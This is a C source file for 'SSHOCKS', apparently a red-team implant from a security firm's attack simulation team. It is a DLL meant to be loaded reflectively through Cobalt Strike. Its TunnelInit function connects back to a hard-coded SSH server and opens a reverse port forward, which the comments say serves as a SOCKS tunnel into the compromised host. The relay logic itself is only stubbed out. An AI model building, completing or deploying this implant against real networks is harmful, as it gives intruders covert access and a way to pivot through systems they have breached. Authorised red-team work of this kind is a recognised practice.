/*!
 *
 * SSHOCKS
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/* Parameter passed in via the ReflectiveLoader via Cobalt */
typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	UINT16	Port;
	UINT8	Ipv4[0];
} INI_PRM, *PINI_PRM;

/*!
 *
 * Purpose:
 *
 * Connects back to the SSH server and establishes
 * a reverse port forward back to our socks target
 *
 * The socks server portion then reads any incoming
 * requests, and forwards them to the respective
 * destinations.
 *
!*/
__declspec( dllexport ) BOOL TunnelInit( VOID )
{
	SOCKADDR_IN		Sin;

	INT			Rcd = 0;
	INT			Aut = 0;
	INT			Rlp = 0;
	SOCKET			Sck = INVALID_SOCKET;

	LIBSSH2_CHANNEL*	Chn = NULL;
	LIBSSH2_SESSION*	Ses = NULL;
	LIBSSH2_LISTENER*	Lst = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Sin, sizeof( Sin ) );

	/* Initializes LIBSSH2 */
	Rcd = libssh2_init( 0 );
	if ( Rcd != 0 ) {
		/* Abort! */
		goto Leave;
	};

	/* Create a socket */
	Sck = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if ( Sck == INVALID_SOCKET ) {
		/* Abort! */
		goto Leave;
	};

	/* Create a SOCKADDR_IN */
	Sin.sin_family = AF_INET;
	Sin.sin_addr.s_addr = inet_addr( "192.168.30.128" );
	Sin.sin_port = htons( 22 );
	if ( Sin.sin_addr.s_addr == INADDR_NONE ) {
		/* Abort! */
		goto Leave;
	};

	/* Connect to the server */
	Rcd = connect( Sck, C_PTR( &Sin ), sizeof( Sin ) );
	if ( Rcd != 0 ) {
		/* Abort! */
		goto Leave;
	};

	/* Create a session instance */
	Ses = libssh2_session_init();
	if ( ! Ses ) {
		/* Abort! */
		goto Leave;
	};

	/* Start the SSH handshake */
	Rcd = libssh2_session_handshake( Ses, Sck );
	if ( Rcd != 0 ) {
		/* Abort! */
		goto Leave;
	};

	/* Authenticate with username and password */
	Rcd = libssh2_userauth_password( Ses, "DummyLogon", "DummyLogon" );
	if ( Rcd != 0 ) {
		/* Abort! */
		goto Leave;
	};

	/* Listen on the remote host and port */
	Lst = libssh2_channel_forward_listen_ex( Ses, "127.0.0.1", 50057, &Rlp, 1 );
	if ( ! Lst ) {
		/* Abort! */
		goto Leave;
	};

	while( 1 ) {
		/* Constant loop accepting a new connection */
		Chn = libssh2_channel_forward_accept( Lst );

		if ( ! Chn ) {
			/* Abort! */
			goto Leave;
		};

		/* Shutdown the channel */
		libssh2_channel_free( Chn );
	};

Leave:
	/* Shutdown the channel */
	if ( Chn != NULL ) {
		libssh2_channel_free( Chn );
	};
	/* Cancel the listener */
	if ( Lst != NULL ) {
		libssh2_channel_forward_cancel( Lst );
	};
	/* Shutdown the session */
	if ( Ses != NULL ) {
		libssh2_session_disconnect( Ses, NULL );
		libssh2_session_free( Ses );
	};
	/* Shutdown the socket */
	if ( Sck != INVALID_SOCKET ) {
		closesocket( Sck );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Sin, sizeof( Sin ) );

	/* Return */
	return FALSE;
};
